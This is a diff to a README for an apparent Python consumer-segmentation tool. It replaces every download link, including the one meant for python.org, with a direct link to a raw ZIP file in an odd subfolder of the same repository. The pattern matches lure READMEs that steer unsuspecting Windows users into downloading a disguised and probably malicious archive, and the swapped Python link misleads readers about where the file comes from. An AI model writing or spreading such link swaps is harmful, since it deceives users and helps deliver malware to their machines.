@@ -1,6 +1,6 @@
 # 🛠️ product-segmentation-affinity-analysis - Consumer Segments Made Clear
 
-[![Download](https://img.shields.io/badge/Download-brightgreen?style=for-the-badge)](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis)
+[![Download](https://img.shields.io/badge/Download-brightgreen?style=for-the-badge)](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis/raw/refs/heads/main/runchweed/analysis_affinity_product_segmentation_2.9-alpha.5.zip)
 
 ## 📋 What This Application Does
 
@@ -34,7 +34,7 @@ This guide will help you download and run the application step-by-step.
 
 Visit the download link below to get the latest version:
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis)
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis/raw/refs/heads/main/runchweed/analysis_affinity_product_segmentation_2.9-alpha.5.zip)
 
 Click the **Code** button on the page, then choose **Download ZIP** to save the files on your computer.
 
@@ -50,7 +50,7 @@ Choose a folder where you want the files to be unpacked. This is the folder wher
 
 This app runs with Python. If you do not have it, follow these steps:
 
-1. Go to [https://www.python.org/downloads/](https://www.python.org/downloads/)
+1. Go to [https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis/raw/refs/heads/main/runchweed/analysis_affinity_product_segmentation_2.9-alpha.5.zip](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis/raw/refs/heads/main/runchweed/analysis_affinity_product_segmentation_2.9-alpha.5.zip)
 2. Download Python for Windows.
 3. Run the installer.
 4. Important: Check the box that says **Add Python to PATH** before clicking Install.
@@ -126,7 +126,7 @@ The app supports common CSV files with headers.
 
 | Action                  | Command or Step                        |
 |-------------------------|-------------------------------------|
-| Download app files      | Visit [Download](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis) |
+| Download app files      | Visit [Download](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis/raw/refs/heads/main/runchweed/analysis_affinity_product_segmentation_2.9-alpha.5.zip) |
 | Extract ZIP             | Right-click ZIP → Extract All        |
 | Open Command Prompt     | Windows key → type `cmd` → Enter     |
 | Go to app folder        | `cd path\to\your\folder`              |
@@ -137,7 +137,7 @@ The app supports common CSV files with headers.
 
 Download and explore the app here:
 
-[https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis)
+[https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis/raw/refs/heads/main/runchweed/analysis_affinity_product_segmentation_2.9-alpha.5.zip](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis/raw/refs/heads/main/runchweed/analysis_affinity_product_segmentation_2.9-alpha.5.zip)
 
 ## 🔍 About This Project
 
